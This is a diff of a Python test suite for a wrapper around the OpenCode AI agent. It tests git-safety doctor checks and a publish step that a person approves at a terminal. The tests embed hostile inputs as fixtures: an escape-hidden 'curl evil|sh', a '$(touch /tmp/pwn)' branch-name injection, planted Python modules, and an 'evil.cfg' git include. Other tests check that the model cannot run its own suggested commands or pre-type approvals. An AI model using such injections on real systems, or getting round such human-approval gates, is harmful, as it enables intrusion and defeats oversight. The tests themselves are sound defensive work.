@@ -8,6 +8,7 @@ from __future__ import annotations
 
 import json
 import os
+import shlex
 import subprocess
 import sys
 import time
@@ -260,9 +261,12 @@ def test_doctor_subcommand(env):
     assert r.returncode == 0, r.stdout
     rows = json.loads(r.stdout)["rows"]
     assert [x["check"] for x in rows] == ["env", "project-git", "instructions", "integrity", "opencode-version",
-                                          "opencode-config", "config-doctor", "gateway-key"]
-    # 시험 설치의 opencode.json은 {}라 게이트웨이 행은 읽지 못함 warn 하나(막지 않는다)
-    assert all(x["status"] == "ok" for x in rows[:-1]) and rows[-1]["status"] == "warn"
+                                          "opencode-config", "config-doctor", "git", "gateway-key"]
+    # 시험 설치의 opencode.json은 {}라 게이트웨이 행은 읽지 못함 warn 하나(막지 않는다). git 행은 호스트 git이 2.38 미만이면
+    # warn이다(Ubuntu 22.04의 git 2.34 — CI site-rehearsal). 판정 자체는 test_git_safe_env_for_children_doctor_row_and_publish가 본다.
+    status = {x["check"]: x["status"] for x in rows}
+    assert status.pop("gateway-key") == "warn" and status.pop("git") in ("ok", "warn")
+    assert set(status.values()) == {"ok"}, status
 
 
 def test_command_name_and_message_required(env):
@@ -349,11 +353,11 @@ def test_terminal_handoff_prints_owner_hint_not_a_filled_command(env):
     work = env["work"]
     _state(work, "ABC-1", OWN)
     _hold_lock(work, "ABC-1", OWN)
-    pub = f"python3 /p/scripts/db_pr.py publish {work}/ABC-1/wt --branch issue/ABC-1 --lease new --approved h --commit"
-    for cmd in (pub, "python3 /p/scripts/db_pr.py snapshot --job ABC-1", f"cd {work} && python3 /p/scripts/db_pr.py discard ABC-1/wt",
+    stg = f"python3 /p/scripts/db_pr.py stage {work}/ABC-1/plan.json --wt {work}/ABC-1/wt --branch issue/ABC-1"
+    for cmd in (stg, "python3 /p/scripts/db_pr.py snapshot --job ABC-1", f"cd {work} && python3 /p/scripts/db_pr.py discard ABC-1/wt",
                 f"python3 /p/scripts/db_verify.py rules --plan {work}/ABC-1/plan.json --draft {work}/ABC-1/draft",
                 "python3 /p/scripts/db_pr.py lock release ABC-1",
-                f"git -C {work} status; {pub}"):                  # 여러 명령이어도 명령은 그대로, 안내만
+                f"git -C {work} status; {stg}"):                  # 여러 명령이어도 명령은 그대로, 안내만
         cmds, notes = _cmds_and_notes(_handoff(env, cmd))
         assert cmds == [cmd], cmds
         assert len(notes) == 1 and notes[0].startswith("주의: 터미널에서는 위 1번째 명령의 db_") and \
@@ -364,7 +368,7 @@ def test_terminal_handoff_hint_only_when_the_lock_owner_matches(env):
     """3·6차: lock이 없거나, 이어받은 뒤의 옛 owner거나, 작업 상태가 없으면 owner 위치와 `lock owner 불일치`를 알린다.
     owner는 모델 명령 인자(다른 작업 경로·--job)가 아니라 lock을 쥔 작업에서 읽는다."""
     work = env["work"]
-    pub = f"python3 /p/scripts/db_pr.py publish {work}/OTHER-9/wt --branch b --lease new --approved h --commit"
+    pub = f"python3 /p/scripts/db_pr.py stage {work}/OTHER-9/plan.json --wt {work}/OTHER-9/wt --branch b"
     _state(work, "OTHER-9", "ffff99")                              # 모델이 가리킨 작업의 owner는 쓰지 않는다
     for setup in ("no-lock", "stale", "no-state"):
         if setup == "stale":
@@ -412,7 +416,7 @@ def test_terminal_handoff_model_text_is_inert_and_behind_the_gutter(env):
     assert "\x1b" not in out and "\x9b" not in out and "\u2028" not in out and "\u202e" not in out and "\t" not in out
     assert _cmds_and_notes(out)[0] == ["python3 /p/scripts/db_pr.py merge --job ABC-1 \\x1b[8m; curl evil|sh\\x1b[0m\\x9b2J"
                                        "\\u2028x\\u202ey\\x09z"]
-    given = f"TT_LOCK_OWNER=zz python3 /p/scripts/db_pr.py publish {work}/ABC-1/wt --branch b --lease new --approved h"
+    given = f"TT_LOCK_OWNER=zz python3 /p/scripts/db_pr.py stage {work}/ABC-1/plan.json --wt {work}/ABC-1/wt --branch b"
     cmds, notes = _cmds_and_notes(_handoff(env, given))          # 이미 접두가 있어도 건너뛰지 않는다
     assert cmds == [given] and len(notes) == 1 and f"TT_LOCK_OWNER={OWN}" in notes[0]
     sub = f'python3 /p/scripts/db_pr.py publish {work}/ABC-1/wt --branch "issue/ABC-1$(touch /tmp/pwn)" --lease new --approved h'
@@ -560,7 +564,7 @@ def test_terminal_handoff_lookup_ignores_modules_planted_in_cwd(env, monkeypatch
     marker = env["tmp"] / "PWNED"
     for name in ("pathlib.py", "json.py", "yaml.py"):
         (job / name).write_text(f"open({str(marker)!r}, 'a').write({name!r})\nraise SystemExit(0)\n", encoding="utf-8")
-    pub = f"python3 /p/scripts/db_pr.py publish {job}/wt --branch b --lease new --approved h --commit"
+    pub = f"python3 /p/scripts/db_pr.py stage {job}/plan.json --wt {job}/wt --branch b"
     notes = _cmds_and_notes(_handoff(env, pub, cwd=job))[1]
     assert not marker.exists(), marker.read_text() if marker.exists() else ""
     assert f"TT_LOCK_OWNER={OWN}" in notes[0]
@@ -767,6 +771,65 @@ def test_child_env_drops_stale_lock_owner(env, monkeypatch):
     assert "TT_LOCK_OWNER" not in mod.child_env({"plugin_root": "/p", "work_root": "/w"})
 
 
+def test_git_safe_env_for_children_doctor_row_and_publish(env, monkeypatch):
+    """OC-C (1)(3): OpenCode 자식·publish의 db_pr에 GIT_SAFE(oc_adapter와 같은 값)를 사용자 GIT_CONFIG_COUNT 항목 뒤에 붙인다. 깨진
+    사용자 값은 그대로 두고(git이 거부) doctor `git` 행이 fail, git 2.38 미만은 warn(시작은 막지 않는다)."""
+    mod = _load("tt_oc", TTOC)
+    from common import oc_adapter
+    assert mod.GIT_SAFE == oc_adapter.GIT_SAFE
+    meta = {"plugin_root": "/p", "work_root": "/w"}
+    for k in [k for k in os.environ if k.startswith("GIT_CONFIG")]:
+        monkeypatch.delenv(k)
+    child = mod.child_env(meta)
+    assert not oc_adapter.git_safe_missing(child) and child["GIT_CONFIG_COUNT"] == "2"
+    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
+    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.pager")
+    monkeypatch.setenv("GIT_CONFIG_VALUE_0", "cat")
+    child = mod.child_env(meta)
+    assert child["GIT_CONFIG_COUNT"] == "3" and child["GIT_CONFIG_VALUE_0"] == "cat" and child["GIT_CONFIG_KEY_1"] == "safe.bareRepository"
+    assert not oc_adapter.git_safe_missing(child)
+    for broken in ({"GIT_CONFIG_COUNT": "x"}, {"GIT_CONFIG_COUNT": "2"}):          # 숫자 아님 / KEY_1 없음
+        for k, v in broken.items():
+            monkeypatch.setenv(k, v)
+        child = mod.child_env(meta)
+        assert child["GIT_CONFIG_COUNT"] == broken["GIT_CONFIG_COUNT"] and oc_adapter.git_safe_missing(child)
+        assert mod.git_row(child)["status"] == "fail"
+    for k in ("GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0", "GIT_CONFIG_VALUE_0"):
+        monkeypatch.delenv(k)
+    assert not oc_adapter.git_safe_missing(mod._publish_env(env["work"], "o" * 32, "/p"))
+    # git 버전: 가짜 git으로 2.37(warn)·2.38(ok)
+    bin_dir = env["tmp"] / "bin"
+    bin_dir.mkdir()
+    fake = bin_dir / "git"
+    for ver, want in (("2.37.1", "warn"), ("2.38.0.windows.1", "ok"), ("2.43.0", "ok")):
+        fake.write_text(f"#!/bin/sh\necho 'git version {ver}'\n", encoding="utf-8")
+        fake.chmod(0o755)
+        row = mod.git_row({**mod.child_env(meta), "PATH": f"{bin_dir}{os.pathsep}{os.environ['PATH']}"})
+        assert row["check"] == "git" and row["status"] == want and ver.split(".windows")[0] in row["detail"], (ver, row)
+    # 리뷰 9 R3: 어댑터와 같은 조건(사본 대조)
+    child = mod.child_env(meta)
+    for e in (child, {}, {**child, "GIT_CONFIG_PARAMETERS": "'safe.bareRepository'='all'"},
+              {**child, "GIT_CONFIG_KEY_1": "SAFE.BAREREPOSITORY", "GIT_CONFIG_VALUE_1": "all"}, {**child, "GIT_CONFIG_COUNT": "3"}):
+        assert mod.git_safe_missing(e) == oc_adapter.git_safe_missing(e), e
+    row = mod.git_row({**child, "GIT_CONFIG_KEY_1": "SAFE.BAREREPOSITORY", "GIT_CONFIG_VALUE_1": "all"})
+    assert row["status"] == "fail" and "걸리지 않는다" in row["detail"], row
+    # 리뷰 10b E2: `GIT_CONFIG_PARAMETERS`(include.path로 키 이름 없이도 GIT_SAFE를 뒤집는다)는 자식 환경에서 뺀다 — doctor도 그 env로 ok
+    monkeypatch.setenv("GIT_CONFIG_PARAMETERS", "'include.path'='/x/evil.cfg'")
+    child2 = mod.child_env(meta)
+    assert "GIT_CONFIG_PARAMETERS" not in child2 and mod.git_row(child2)["status"] != "fail"
+    monkeypatch.delenv("GIT_CONFIG_PARAMETERS")
+    # R4: 사용자 GIT_ALLOW_PROTOCOL은 protocol.ext.allow=never를 이긴다 — 자식 환경에서 뺀다
+    monkeypatch.setenv("GIT_ALLOW_PROTOCOL", "ext")
+    assert "GIT_ALLOW_PROTOCOL" not in mod.child_env(meta)
+    # R5: git을 실행하지 못한 것과 2.38 미만은 다른 문구
+    fake.write_text("#!/bin/sh\nexit 1\n", encoding="utf-8")
+    row = mod.git_row({**child, "PATH": f"{bin_dir}{os.pathsep}{os.environ['PATH']}"})
+    assert row["status"] == "warn" and "git version 실패" in row["detail"] and "2.38" not in row["detail"], row
+    monkeypatch.setattr(mod, "_run", lambda *a, **k: (_ for _ in ()).throw(FileNotFoundError("git")))
+    row = mod.git_row(child)
+    assert row["status"] == "warn" and "실행하지 못했다" in row["detail"] and "2.38" not in row["detail"], row
+
+
 def test_finish_reason_length_step_limit_and_zero_tokens(env):
     """런타임 리뷰 4: 끝난 이유를 보이고, 출력 한도(length)·에이전트 스텝 한도는 no-final-text와 다른 이름(종료 1). 토큰 0은 주의."""
     events(env, [ev("step_start"), ev("text", text="잘린 화면"), step("length")])
@@ -941,3 +1004,470 @@ def test_shared_checks_for_site_step(env):
     assert ran and row == {"check": "opencode-version", "status": "ok", "detail": f"{PINNED} (고정 {PINNED})"}
     row, ran = mod.version_row(str(env["tmp"] / "no-opencode"), env["env"])
     assert not ran and row["status"] == "fail" and row["detail"].startswith("opencode 실행 실패")
+
+
+# -- publish (OC-A): 사람이 터미널에서 확인 화면을 보고 작업 키를 입력하면 게시 --------------------------------------------------
+# 가짜 plugin: 실제 `dbpr/`·`common/`(작업 조회 하위 프로세스가 import)에 argv를 기록하는 스텁 `scripts/db_pr.py`.
+# 승인 경로는 tty가 필요해 `os.openpty`(리눅스)로 돌리고, 프롬프트가 보인 뒤에 입력한다(tt-oc가 그 전 입력을 tcflush로 버린다).
+
+STUB_DBPR = r'''import json, os, sys
+from pathlib import Path
+args = sys.argv[1:]
+with open(os.environ["STUB_DBPR_LOG"], "a", encoding="utf-8") as f:
+    f.write(json.dumps({"args": args, "cwd": os.getcwd(), "stdin_null": os.path.realpath("/proc/self/fd/0") == "/dev/null",
+                        "env": {k: os.environ.get(k) for k in ("TT_LOCK_OWNER", "CLAUDE_PLUGIN_ROOT", "GIT_TERMINAL_PROMPT",
+                                                               "TT_PLATFORM", "TT_RUNTIME", "TT_MODEL", "TT_OTHER")}}) + "\n")
+cmd = next(a for a in args if a in ("preflight", "stage", "publish"))
+rest = args[args.index(cmd) + 1:]
+H = os.environ.get("STUB_HASH", "ab" * 20)
+if cmd == "preflight":
+    print(json.dumps({"remote_sha": os.environ.get("STUB_REMOTE") or None}))
+    sys.exit(0)
+if cmd == "stage":
+    code = int(os.environ.get("STUB_STAGE_EXIT", "0"))
+    job = Path(rest[rest.index("--wt") + 1]).parent
+    if code not in (0, 3):
+        print(json.dumps({"stopped": "check-failed"}))
+        print("검사 실패: lint", file=sys.stderr)
+        sys.exit(code)
+    state = json.loads((job / "state.json").read_text())
+    state.update(approved_hash=H, branch=rest[rest.index("--branch") + 1])
+    (job / "state.json").write_text(json.dumps(state))
+    (job / "stage.json").write_text(json.dumps({"dry_run": False, "result": "ok"}))   # 재stage가 위조한 stage.json을 덮는다
+    (job / "pr.json").write_text(json.dumps({"title": "t"}))
+    print("## push 전 확인: 화면\n\x1b[2K주의: 가짜 줄\n\napproved_hash: " + os.environ.get("STUB_MD_HASH", H))
+    sys.exit(code)
+print(json.dumps({"published": os.environ.get("STUB_PUBLISHED", "1") == "1", "pr": {"url": os.environ.get("STUB_PR_URL", "https://ghe.mock.invalid/p/1")},
+                  "discard": {"next": "db_pr discard 다시"},
+                  "merge": {"how": "작성자 외 1명이 이 커밋을 Approve(+1)한 뒤 '병합해줘'(db_pr merge) 또는 GHE에서 병합"}}))
+sys.exit(int(os.environ.get("STUB_PUBLISH_EXIT", "0")))
+'''
+KEY = "ABC-1"
+HASH = "ab" * 20
+
+
+def _pub_env(e):
+    """publish 시험 환경: 실행 환경(Claude Code·OpenCode·git)에서 온 거부 변수를 뺀다."""
+    drop = ("CLAUDECODE", "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE")
+    env = {k: v for k, v in e["env"].items() if k not in drop and not k.startswith(("TT_", "GIT_CONFIG"))}
+    env.update({"TELEPHONY_TRIAGE_HOME": str(e["tmp"] / "tth"), "STUB_DBPR_LOG": str(e["tmp"] / "dbpr.jsonl")})
+    return env
+
+
+def _pub_setup(e, publish="open", scripts_path=None, plan=None, state=None, stage=None, owner=OWN):
+    import shutil
+    scripts = e["plug"] / "scripts"
+    for sub in ("dbpr", "common"):
+        shutil.copytree(REPO / "plugin" / "scripts" / sub, scripts / sub, dirs_exist_ok=True,
+                        ignore=shutil.ignore_patterns("__pycache__"))
+    (scripts / "db_pr.py").write_text(STUB_DBPR, encoding="utf-8")
+    write_meta(e["proj"], e["plug"], e["work"], **({"publish": publish} if publish is not None else {}))
+    (e["tmp"] / "tth").mkdir(exist_ok=True)
+    (e["tmp"] / "tth" / "config.yaml").write_text(json.dumps({"plugin": {"scripts_path": str(scripts_path or scripts)}}),
+                                                  encoding="utf-8")
+    _state(e["work"], KEY, owner)
+    _hold_lock(e["work"], KEY, owner)
+    job = e["work"] / KEY
+    subprocess.run(["git", "init", "-q", str(job / "wt")], check=True)     # tt-oc가 wt에서 무시 파일·원격 tip을 git으로 본다
+    for name, data in (("plan.json", plan or {"source": "analyze", "pr": {"head_sha": None}}),
+                       ("state.json", state or {"branch": f"issue/{KEY}", "approved_hash": None}),
+                       ("stage.json", stage or {"dry_run": False})):
+        (job / name).write_text(json.dumps(data), encoding="utf-8")
+    return job
+
+
+def dbpr_calls(e):
+    p = e["tmp"] / "dbpr.jsonl"
+    return [json.loads(x) for x in p.read_text(encoding="utf-8").splitlines()] if p.exists() else []
+
+
+def _remote_commit(job, subject="남의 커밋"):
+    """원격 브랜치 tip 흉내: wt에 남의 커밋 하나(preflight 스텁의 remote_sha로 쓴다). 계획 pr.head_sha도 그 sha로(모델이 맞춘 꼴)."""
+    wt = str(job / "wt")
+    subprocess.run(["git", "-C", wt, "-c", "user.name=Other Dev", "-c", "user.email=other@ghe.mock.invalid", "commit",
+                    "-q", "--allow-empty", "-m", subject], check=True)
+    sha = subprocess.run(["git", "-C", wt, "rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
+    (job / "plan.json").write_text(json.dumps({"source": "analyze", "pr": {"head_sha": sha}}), encoding="utf-8")
+    return sha
+
+
+PTY = pytest.mark.skipif(not hasattr(os, "openpty") or sys.platform == "win32", reason="tty 시험은 리눅스(os.openpty)")
+PROMPT = "작업 키를 입력한다".encode()
+PROMPT2 = "'덮어쓰기'를 입력한다".encode()
+
+
+def pty_tt(env, proj, *args, answers=(), on_prompt=None, timeout=120, early=b""):
+    """tt-oc를 pty에서 돌린다. 프롬프트가 보일 때마다 `on_prompt(n)`을 부르고 answers[n]을 입력한다(None이면 EOF, Ctrl-D).
+    `early`는 시작하자마자(프롬프트 전에) 써 넣는 입력이다."""
+    import select
+    master, slave = os.openpty()
+    proc = subprocess.Popen([sys.executable, str(TTOC), "--project", str(proj), *args], stdin=slave, stdout=slave,
+                            stderr=slave, env=env, close_fds=True)
+    os.close(slave)
+    if early:
+        os.write(master, early)
+    out, sent, deadline = b"", 0, time.monotonic() + timeout
+    try:
+        while time.monotonic() < deadline:
+            if select.select([master], [], [], 0.2)[0]:
+                try:
+                    chunk = os.read(master, 65536)
+                except OSError:          # 자식이 끝나 pty가 닫혔다(EIO)
+                    break
+                if not chunk:
+                    break
+                out += chunk
+            while sent < len(answers) and out.count(PROMPT) + out.count(PROMPT2) > sent:
+                if on_prompt:
+                    on_prompt(sent)
+                os.write(master, b"\x04" if answers[sent] is None else answers[sent].encode() + b"\n")
+                sent += 1
+        code = proc.wait(timeout=10)
+    finally:
+        if proc.poll() is None:
+            proc.kill()
+        os.close(master)
+    return code, out.decode("utf-8", "replace").replace("\r\n", "\n")
+
+
+def test_publish_closed_and_not_tty(env):
+    """닫힘(키 없음·open 아님)이면 무엇보다 먼저 종료 2, 열려도 tty가 아니면 종료 2 — 어느 쪽도 db_pr를 부르지 않는다."""
+    for publish in (None, "closed"):
+        _pub_setup(env, publish=publish)
+        r = tt({**env, "env": _pub_env(env)}, "publish")
+        assert r.returncode == 2 and "이 설치에서 닫힘" in r.stderr and "--allow-publish" in r.stderr, r.stderr
+    _pub_setup(env)
+    r = subprocess.run([sys.executable, str(TTOC), "--project", str(env["proj"]), "publish"], env=_pub_env(env),
+                       input=f"{KEY}\n", capture_output=True, text=True, timeout=60)
+    assert r.returncode == 2 and "tty" in r.stderr, r.stderr
+    assert tt({**env, "env": _pub_env(env)}, "--job", KEY, "--", "x").returncode == 2      # --job은 publish에서만
+    assert dbpr_calls(env) == [] and calls(env) == []
+
+
+@PTY
+@pytest.mark.parametrize("var,val", [("TT_RUNTIME", "opencode"), ("TT_RUNTIME", ""), ("CLAUDECODE", "1"), ("CLAUDECODE", ""),
+                                     ("GIT_DIR", "/x"), ("GIT_CONFIG_COUNT", "1"), ("GIT_ALLOW_PROTOCOL", "ext"),
+                                     ("GIT_CONFIG_GLOBAL", "/x")])
+def test_publish_refuses_nested_runtime_and_git_env(env, var, val):
+    _pub_setup(env)
+    code, out = pty_tt({**_pub_env(env), var: val}, env["proj"], "publish")
+    assert code == 2 and var in out, out
+    want = f"env -u {var} {shlex.quote(str(TTOC.resolve()))} --project {env['proj']} publish"      # 리뷰 G-7, 자신의 절대 경로(RR-5)
+    assert (want in out) == var.startswith("GIT_"), out
+    assert dbpr_calls(env) == []
+
+
+@PTY
+@pytest.mark.parametrize("case", ["no-job", "two-jobs", "dry-run", "record", "branch", "scripts-path", "integrity"])
+def test_publish_refusals_before_db_pr(env, case):
+    _pub_setup(env, **{"dry-run": {"stage": {"dry_run": True}}, "record": {"plan": {"source": "record"}},
+                       "branch": {"state": {"branch": "issue/OTHER-2"}},
+                       "scripts-path": {"scripts_path": env["work"] / KEY / "evil"}}.get(case, {}))
+    if case == "no-job":
+        (env["work"] / "session.lock").unlink()
+    if case == "two-jobs":            # 플랫폼 work_dir 둘에 같은 작업 키의 lock
+        other = env["work"] / "ofono"
+        other.mkdir()
+        _state(other, KEY, "1" * 32)
+        _hold_lock(other, KEY, "1" * 32)
+    if case == "integrity":
+        (env["plug"] / "scripts" / "common" / "oc_adapter.py").write_text("# 바뀜\n", encoding="utf-8")
+    code, out = pty_tt(_pub_env(env), env["proj"], "publish")
+    assert code == 2 and "거부" in out, out
+    want = {"no-job": "찾지 못함", "two-jobs": "여럿", "dry-run": "dry-run", "record": "analyze 등록만", "branch": "branch",
+            "scripts-path": "sync-scripts-path", "integrity": "scripts/**/*.py"}[case]
+    assert want in out, out
+    if case == "two-jobs":
+        assert "찾지 못함" in pty_tt(_pub_env(env), env["proj"], "publish", "--job", "ZZZ-9")[1]
+    assert dbpr_calls(env) == []
+
+
+@PTY
+def test_publish_lease_and_stage_failures(env):
+    """원격 브랜치가 계획 PR head와 다르면 덮어쓰기를 대신 정하지 않고 거부. stage 1이면 출력을 거터 뒤에 보이고 거부.
+    화면의 approved_hash가 state.json과 다르면 거부."""
+    _pub_setup(env)
+    e = _pub_env(env)
+    code, out = pty_tt({**e, "STUB_REMOTE": "c" * 40}, env["proj"], "publish")
+    assert code == 2 and "Claude Code에서" in out and [c["args"][-3] for c in dbpr_calls(env)] == ["preflight"], out
+    code, out = pty_tt({**e, "STUB_STAGE_EXIT": "1"}, env["proj"], "publish")
+    assert code == 2 and f"{S}검사 실패: lint" in out and "stage 종료 1" in out, out
+    code, out = pty_tt({**e, "STUB_MD_HASH": "cd" * 20}, env["proj"], "publish")
+    assert code == 2 and "state.json과 다르다" in out, out
+    assert not any("publish" in c["args"] for c in dbpr_calls(env))
+
+
+@PTY
+@pytest.mark.parametrize("answer", ["", "abc-1", "y", None])
+def test_publish_cancel(env, answer):
+    _pub_setup(env)
+    code, out = pty_tt(_pub_env(env), env["proj"], "publish", answers=[answer])
+    assert code == 0 and "게시하지 않았다(작업은 다시 stage된 상태" in out, out
+    assert [c["args"][4] for c in dbpr_calls(env)] == ["preflight", "stage"]
+    wt = env["work"] / KEY / "wt"                 # 리뷰 A-6: 그대로 칠 수 있는 discard(owner 포함)
+    assert f"그만두려면 터미널에서 TT_LOCK_OWNER={OWN} {shlex.quote(sys.executable)} {env['plug'] / 'scripts' / 'db_pr.py'} --platform android "         f"discard {wt})." in out, out
+
+
+@PTY
+def test_publish_approve_after_full_diff(env):
+    """d → 전체 diff를 보이고 다시 묻는다 → KEY → (원격에 커밋이 있어) 덮어쓰기 → publish(--approved = 화면의 해시, lease,
+    --commit --and-discard). 하위 프로세스는 사용자의 TT_*를 빼고 owner·플러그인 루트·GIT_TERMINAL_PROMPT=0과 Triage-Env용
+    TT_RUNTIME=opencode·TT_MODEL(리뷰 A-2)만, stdin /dev/null, cwd는 플러그인 scripts. 화면은 거터 뒤, 제어 문자 이스케이프. 원격 tip의
+    작성자·제목은 tt-oc 줄에 보인다. 끝은 병합 줄(OpenCode에서 닫힌 db_pr merge 대신 Claude Code)과 `PR: <url>`(리뷰 A-9)."""
+    job = _pub_setup(env)
+    sha = _remote_commit(job)
+    code, out = pty_tt({**_pub_env(env), "STUB_REMOTE": sha, "TT_PLATFORM": "x", "TT_OTHER": "y"}, env["proj"],
+                       "publish", "--job", KEY, answers=["d", KEY, "덮어쓰기"])
+    assert code == 0, out
+    assert out.count(PROMPT.decode()) == 2 and out.count(PROMPT2.decode()) == 1 and f"{S}(변경 없음)" in out, out
+    assert f"{S}\\x1b[2K주의: 가짜 줄" in out and f"{S}approved_hash: {HASH}" in out and "\x1b" not in out
+    assert f"approved_hash {HASH[:12]}…" in out and f"원격 {sha[:7]}를 이 내용으로 갱신" in out and "게시했다" in out
+    assert f"원격 issue/{KEY}에 커밋이 이미 있다: {sha[:7]} · Other Dev <other@ghe.mock.invalid> · " in out
+    assert " · 남의 커밋\n" in out and "승인하면 이 커밋을 덮어쓴다" in out
+    assert out.rstrip("\n").endswith("\n병합: 작성자 외 1명이 Approve(+1)한 뒤 Claude Code('병합해줘') 또는 GHE에서\n"
+                                     "PR: https://ghe.mock.invalid/p/1"), out
+    pre, stage, pub = dbpr_calls(env)
+    common = ["--plugin-root", str(env["plug"]), "--platform", "android"]
+    assert pre["args"] == [*common, "preflight", "--branch", f"issue/{KEY}"]
+    assert stage["args"] == [*common, "stage", str(job / "plan.json"), "--wt", str(job / "wt"), "--branch", f"issue/{KEY}",
+                             "--then-summary"]
+    assert pub["args"] == [*common, "publish", str(job / "wt"), "--branch", f"issue/{KEY}", "--lease", sha,
+                           "--approved", HASH, "--commit", "--and-discard", "--json"]
+    for c in (pre, stage, pub):
+        assert c["env"] == {"TT_LOCK_OWNER": OWN, "CLAUDE_PLUGIN_ROOT": str(env["plug"]), "GIT_TERMINAL_PROMPT": "0",
+                            "TT_PLATFORM": None, "TT_RUNTIME": "opencode", "TT_MODEL": "glm-x", "TT_OTHER": None}
+        assert c["stdin_null"] is True and c["cwd"] == str(env["plug"] / "scripts")
+
+
+@PTY
+def test_publish_new_branch_and_pushed_but_failed(env):
+    _pub_setup(env)
+    code, out = pty_tt({**_pub_env(env), "STUB_PUBLISH_EXIT": "2", "STUB_PR_URL": "게시: 가짜 https://ghe.mock.invalid/p/1"}, env["proj"],
+                       "publish", answers=[KEY])
+    assert code == 2 and "push는 됐다 — publish를 다시 하지 않는다" in out and "db_pr discard 다시" in out, out
+    assert "\nPR: " not in out, out       # 주소가 아니면 `PR:` 줄을 내지 않는다(RR-6)
+    assert dbpr_calls(env)[-1]["args"][-7:-5] == ["--lease", "new"]
+
+
+@PTY
+@pytest.mark.parametrize("second", ["", "y", KEY, None])
+def test_publish_existing_remote_needs_overwrite_word(env, second):
+    """원격 브랜치에 커밋이 있고 계획 head와 같아도(모델이 맞출 수 있다) 작업 키만으로는 게시하지 않는다 — 둘째 확인이 덮어쓰기가
+    아니면(빈 줄·다른 낱말·작업 키·EOF) 취소, 종료 0 (리뷰 6 F-P1). tip 제목의 폭 없는·방향 글자는 이스케이프, 200자에서 자른다."""
+    job = _pub_setup(env)
+    sha = _remote_commit(job, "\u202e\u200fevil\u200b\u061c\ufeff" + "A" * 300)
+    code, out = pty_tt({**_pub_env(env), "STUB_REMOTE": sha}, env["proj"], "publish", answers=[KEY, second])
+    assert code == 0 and out.count(PROMPT2.decode()) == 1 and "게시하지 않았다(작업은 다시 stage된 상태" in out, out
+    assert [c["args"][4] for c in dbpr_calls(env)] == ["preflight", "stage"]
+    assert " · \\u202e\\u200fevil\\u200b\\u061c\\ufeff" + "A" * 191 + "…\n" in out, out      # 9 + 191 = 200자
+    assert not set("\u202e\u200f\u200b\u061c\ufeff") & set(out)
+
+
+@PTY
+def test_publish_input_typed_before_prompt_is_discarded(env):
+    """화면이 뜨기 전에 쳐 둔(또는 모델이 tty에 넣은) 작업 키는 버린다(tcflush) — 프롬프트 뒤 EOF면 게시하지 않는다 (리뷰 6 F-P2a)."""
+    _pub_setup(env)
+    code, out = pty_tt(_pub_env(env), env["proj"], "publish", answers=[None], early=f"{KEY}\n".encode())
+    assert code == 0 and "게시하지 않았다" in out, out
+    assert [c["args"][4] for c in dbpr_calls(env)] == ["preflight", "stage"]
+
+
+@PTY
+@pytest.mark.parametrize("name", ["stage.json", "state.json", "pr.json", "plan.json"])
+def test_publish_refuses_when_job_files_change_after_screen(env, name):
+    job = _pub_setup(env)
+
+    def forge(_n):
+        p = job / name
+        p.write_text(p.read_text(encoding="utf-8") + " ", encoding="utf-8")
+
+    code, out = pty_tt(_pub_env(env), env["proj"], "publish", answers=[KEY], on_prompt=forge)
+    assert code == 2 and "화면 뒤에 작업 파일" in out, out
+    assert not any("publish" in c["args"] for c in dbpr_calls(env))
+
+
+def test_publish_hint_one_line_and_doctor_row_only_when_configured(env):
+    """리뷰 A-1·F-1·G-1: 모델이 보인 db_pr.py publish 명령(막힌 호출 — 따옴표 없는 경로·문서 꼴 따옴표 경로, 최종 글로만)은 열림·닫힘
+    모두 `게시:` 한 줄 — 붙여 넣지 않는다, 열림이면 tt-oc publish, 닫힘이면 Claude Code. publish에는 TT_LOCK_OWNER 안내가 없다(다른
+    owner 명령은 그대로 — handoff 시험). doctor publish 행은 tt-oc.json에 키가 있을 때만(키 없음이면 test_doctor_subcommand 그대로)."""
+    work = env["work"]
+    _state(work, "ABC-1", OWN)
+    _hold_lock(work, "ABC-1", OWN)
+    rest = f"{work}/ABC-1/wt --branch issue/ABC-1 --lease new --approved h --commit --and-discard --json"
+    bare, quoted = f"python3 /p/scripts/db_pr.py publish {rest}", f'python3 "/p/scripts/db_pr.py" publish {rest}'
+
+    def text_only(cmd):
+        events(env, final(f"```sh\n{cmd}\n```\nOpenCode v1에서는 실행하지 않습니다. 터미널이나 Claude Code에서 직접 실행하세요."))
+        r = tt(env, "--", "x")
+        assert r.returncode == 0, r.stdout + r.stderr
+        return r.stdout
+
+    for publish, want in ((None, "이 설치는 게시가 닫혀 있다. Claude Code에서 등록한다"),
+                          ("open", f"OpenCode 세션을 닫은 터미널에서 tt-oc --project {env['proj']} publish")):
+        if publish:
+            write_meta(env["proj"], env["plug"], env["work"], publish=publish)
+        for case, out in (("bare", _handoff(env, bare)), ("quoted", _handoff(env, quoted)), ("text", text_only(quoted))):
+            hint = [x for x in out.splitlines() if x.startswith("게시:")]
+            assert len(hint) == 1 and hint[0].startswith("게시: 모델이 보인 db_pr.py publish 명령은 붙여 넣지 않는다 — " + want), \
+                (publish, case, out)
+            assert "TT_LOCK_OWNER" not in out, (publish, case, out)
+        assert "게시:" not in _handoff(env, "python3 /p/scripts/db_pr.py merge --job ABC-1")
+    rows = _doctor_rows(env)[1]
+    assert rows["publish"]["status"] == "ok" and rows["publish"]["detail"].startswith("열림")
+    write_meta(env["proj"], env["plug"], env["work"], publish="closed")
+    assert _doctor_rows(env)[1]["publish"]["detail"].startswith("닫힘")
+
+
+_R = "/w/ABC-1/wt --branch issue/ABC-1 --lease new --approved h --commit"
+PUBLISH_FORMS = [     # (이름, 막힌 호출 b·최종 글로만 t, 명령·글, `게시:` 줄 수, TT_LOCK_OWNER 안내 줄 수)
+    ("bare", "b", f"python3 /p/scripts/db_pr.py publish {_R}", 1, 0),
+    ("-u", "b", f"python3 -u /p/scripts/db_pr.py publish {_R}", 1, 0),
+    ("single-quote", "b", f"python3 '/p/scripts/db_pr.py' publish {_R}", 1, 0),
+    ("space-path", "b", f'python3 "/p/my scripts/db_pr.py" publish {_R}', 1, 0),
+    ("platform-before", "b", f"python3 /p/scripts/db_pr.py --platform android publish {_R}", 1, 0),
+    ("json-before", "b", f"python3 /p/scripts/db_pr.py --json publish {_R}", 1, 0),
+    ("platform-after", "b", f"python3 /p/scripts/db_pr.py publish --platform android {_R}", 1, 0),
+    ("two-spaces", "b", f"python3 /p/scripts/db_pr.py  publish {_R}", 1, 0),
